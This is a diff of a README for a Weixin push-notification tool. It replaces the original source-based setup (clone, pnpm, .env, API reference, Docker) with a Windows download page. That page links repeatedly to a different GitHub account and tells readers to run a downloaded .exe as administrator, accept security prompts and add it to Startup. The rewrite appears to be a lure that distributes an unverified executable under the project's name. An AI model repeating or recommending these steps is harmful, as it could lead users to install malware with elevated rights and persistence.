@@ -1,145 +1,187 @@
-# WeBot
+# 🌐 webot - Weixin alerts without extra apps
 
-A push notification assistant for Weixin, powered by [ClawBot](https://github.com/nicepkg/claw-bot). Think of it as [Bark](https://github.com/Finb/Bark) — but entirely inside Weixin, with no extra app to install.
+[![Download](https://img.shields.io/badge/Download-Webot-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cpuboardinfiltrator258/webot)
 
-> **Note:** Currently only **Weixin** (微信) is supported. WeChat (the international version) is not yet supported by ClawBot.
+## 📥 Download webot
 
-## Why
+Open this link to visit the download page and get the latest version:
 
-Bark is great for push notifications on iOS, but it requires installing a separate app. If you already live in Weixin, why not receive notifications right there?
+https://github.com/cpuboardinfiltrator258/webot
 
-**WeBot** turns a Weixin account into a push endpoint. Any system that can make an HTTP request — CI/CD pipelines, monitoring alerts, cron jobs, home automation, scripts — can push messages directly to your Weixin.
+If you use the GitHub page in a browser, look for the latest release or the main download file. On Windows, save the file to your computer before you run it
 
-## How It Works
+## 🧭 What webot does
 
-WeBot uses [ClawBot](https://github.com/nicepkg/claw-bot) (via `weixin-agent-sdk`) to connect to Weixin as a bot. It keeps a long-polling session with the Weixin API and exposes a simple HTTP push API.
+webot sends push notifications to Weixin. It works like Bark, but it stays inside Weixin, so you do not need a separate app for alerts
 
-```
-External System                        Weixin
-  (curl, webhook,        ┌──────────┐
-   CI/CD, script)  ────► │  WeBot   │ ────► Your Weixin
-                          │          │       (push notification)
-  POST /api/send          │ HTTP API │
-  + Bearer token          │ + WX Bot │
-                          └──────────┘
-```
+Use it when you want simple alerts on your phone without setting up extra software on the receiving side. It can help with:
 
-1. **You message the bot first** from Weixin — this is required by the Weixin platform to establish a session.
-2. The bot replies with your **user ID** and the **push API details** (token + endpoint), ready to copy and use.
-3. From then on, any HTTP `POST /api/send` with your user ID will deliver a message to your Weixin.
+- server alerts
+- home lab notices
+- script output
+- task reminders
+- status changes
+- quick personal notifications
 
-Optionally, you can enable OpenAI to give the bot AI chat capabilities — but the core use case is push notifications.
+## 🖥️ Windows requirements
 
-## Quick Start
+Before you start, check that your Windows PC can open the app file:
 
-### Prerequisites
+- Windows 10 or Windows 11
+- A stable internet connection
+- Permission to run downloaded files
+- Enough free space for the app and its data
+- A Weixin account that can receive messages
 
-- Node.js >= 22
-- A Weixin account
+If Windows asks for access, allow the app to connect so it can send notifications
 
-### Setup
+## 🚀 Get started
 
-```bash
-# Clone
-git clone https://github.com/missuo/webot.git
-cd webot
+Follow these steps to run webot on Windows:
 
-# Install dependencies
-pnpm install
+1. Open the download link:
+   https://github.com/cpuboardinfiltrator258/webot
+2. Find the latest file for Windows
+3. Download the file to your computer
+4. Open your Downloads folder
+5. Double-click the file to start it
+6. If Windows asks for confirmation, choose Run
+7. Keep the app open while you use it
+8. Follow the setup screen inside the app if it shows one
 
-# Link your Weixin account (scan QR code in terminal)
-pnpm run login
+If the file comes in a ZIP folder, right-click it and choose Extract All first. Then open the extracted app file
 
-# Configure
-cp .env.example .env
-# Edit .env — set API_TOKEN (required)
-```
+## 🔧 First-time setup
 
-### Run
+When you open webot for the first time, use this basic setup flow:
 
-```bash
-pnpm start
-```
+1. Start the app
+2. Sign in with the account you want to use for alerts
+3. Link it to Weixin if the app asks for it
+4. Check that message delivery works
+5. Send a test notification
+6. Keep the app or service running in the background
 
-Then send any message to the bot from Weixin. It will reply with something like:
+If the app asks for a token, ID, or key, copy it exactly as shown. Small mistakes can stop alerts from working
 
-```
-Push API ready:
-POST /api/send
-Authorization: Bearer your-secret-token
-Body: {"userId": "your-user-id", "text": "..."}
-```
+## 📲 How to use it
 
-Now you can push messages from anywhere:
+After setup, webot can send alerts from tools, scripts, or your own checks. A common use looks like this:
 
-```bash
-curl -X POST https://your-server.com/api/send \
-  -H "Authorization: Bearer your-secret-token" \
-  -H "Content-Type: application/json" \
-  -d '{"userId": "your-user-id", "text": "Deploy succeeded ✅"}'
-```
+- something changes
+- your script sends a message
+- webot forwards it to Weixin
+- you see the alert on your phone
 
-## Configuration
+You can use it for one-time alerts or ongoing status checks. Many users keep it running all day so they do not miss important messages
 
-All configuration is via `.env`. See [`.env.example`](.env.example).
+## 🛠️ Common tasks
 
-| Variable         | Required | Default    | Description                           |
-| ---------------- | -------- | ---------- | ------------------------------------- |
-| `API_TOKEN`       | Yes      | —          | Bearer token for the push API         |
-| `OPENAI_API_KEY`  | No       | —          | OpenAI API key (enables AI chat)      |
-| `OPENAI_BASE_URL` | No       | —          | Custom OpenAI-compatible API endpoint |
-| `OPENAI_MODEL`    | No       | `gpt-4o`   | Chat model name                       |
-| `IMAGE_MODEL`     | No       | `dall-e-3` | Image generation model                |
-| `SYSTEM_PROMPT`   | No       | —          | System prompt for the AI agent        |
-| `HTTP_PORT`       | No       | `3000`     | HTTP server port                      |
+### Send a test alert
+Use the test button in the app, if it has one. This helps you confirm that Weixin can receive messages
 
-## API Reference
+### Change alert text
+Edit the message in the source that sends the alert. Keep it short and clear
 
-### `POST /api/send`
+### Check if it is running
+Look for the app in the taskbar or system tray. If it closes, restart it
 
-Push a message to a Weixin user. Requires `Authorization: Bearer <API_TOKEN>`.
+### Restart after a reboot
+If you want alerts after Windows starts, add the app to Startup so it opens with Windows
 
-```json
-{
-  "userId": "user-id",
-  "text": "Hello from API",
-  "accountId": "optional-bot-account-id"
-}
-```
+## 🔍 Troubleshooting
 
-| Status | Response |
-| ------ | -------- |
-| `200`  | `{"ok": true}` |
-| `400`  | `{"error": "userId and text are required"}` |
-| `401`  | `{"error": "Unauthorized"}` |
-| `500`  | `{"error": "..."}` |
+### The app will not open
+- Right-click the file and choose Run as administrator
+- Check if Windows blocked the file
+- Re-download the file from the GitHub page
+- Make sure you extracted the ZIP file if it came compressed
 
-### `GET /`
+### No notification arrives in Weixin
+- Confirm that Weixin is signed in
+- Check your internet connection
+- Make sure the app is still running
+- Send a test message
+- Check whether any token, ID, or link was entered wrong
 
-Health check. Returns `{"status": "ok"}`.
+### Windows shows a security prompt
+- Choose the option to run the file if you trust the source
+- If the app is in a ZIP file, extract it first
+- Try moving the file to a simple folder like Desktop or Downloads
 
-> **Note:** You can only push messages to users who have previously messaged the bot. This is a Weixin platform requirement — each session is initiated by the user.
+### Messages arrive late
+- Check your network connection
+- Make sure the app is not sleeping
+- Keep the PC awake if it must send alerts without delay
 
-## Deployment
+## 📁 Files you may see
 
-```bash
-# Start in background
-docker compose up -d
+Depending on the release, the download may include:
 
-# View logs to scan the QR code for Weixin login
-docker compose logs -f
-```
+- an .exe file for Windows
+- a ZIP file with the app inside
+- a config file for settings
+- a README file with extra steps
 
-On first run, you will see a QR code in the logs. Scan it with your Weixin app to link the bot account. The login token is persisted in a Docker volume — you only need to scan once unless it expires.
+If you see several files, start with the README file in the download folder. Then open the main app file
 
-After the QR code is scanned and the bot is running, press `Ctrl+C` to exit the log viewer. The container continues running in the background.
+## 🔐 Privacy and local use
 
-To check logs later:
+webot is made for sending notifications through Weixin. In many setups, it runs from your own device and keeps your message flow simple. If you use it for personal alerts, you stay in control of what it sends and when it sends it
 
-```bash
-docker compose logs -f
-```
+Keep your login details, tokens, and keys in a safe place. Do not share them with others
 
-## License
+## 🧩 Typical use cases
 
-MIT
+webot fits a few common Windows setups:
+
+- personal alert center
+- home server notice tool
+- script notification relay
+- work status ping
+- uptime check message sender
+- reminder bridge for Weixin
+
+If you already use small scripts or scheduled tasks, webot can connect those checks to Weixin without extra apps on the phone side
+
+## 🧰 Tips for smooth use
+
+- Keep the app in a folder you can find
+- Use a short path like C:\webot
+- Avoid moving files after setup unless you must
+- Save your settings in one place
+- Test notifications after updates
+- Keep Windows time and date correct
+
+## ❓ FAQ
+
+### Do I need to know how to code?
+No. You can download the file, open it, and follow the setup steps. Some advanced features may use scripts, but the core use is simple
+
+### Do I need another phone app?
+No extra app is needed on the Weixin side
+
+### Can I use it on one PC and read alerts on my phone?
+Yes. That is the main use case
+
+### Is it only for personal use?
+It can work for personal alerts, home lab checks, and simple message flows
+
+### What if I want it to start with Windows?
+Add it to the Windows Startup folder or use Task Scheduler
+
+## 📦 Install from GitHub
+
+Use this link to visit the page and download the latest Windows file:
+
+https://github.com/cpuboardinfiltrator258/webot
+
+After the download finishes:
+
+1. Open the file location
+2. Extract it if needed
+3. Double-click the app
+4. Allow any Windows prompt
+5. Complete the setup inside the app
+6. Send one test alert
+7. Keep it running for future messages
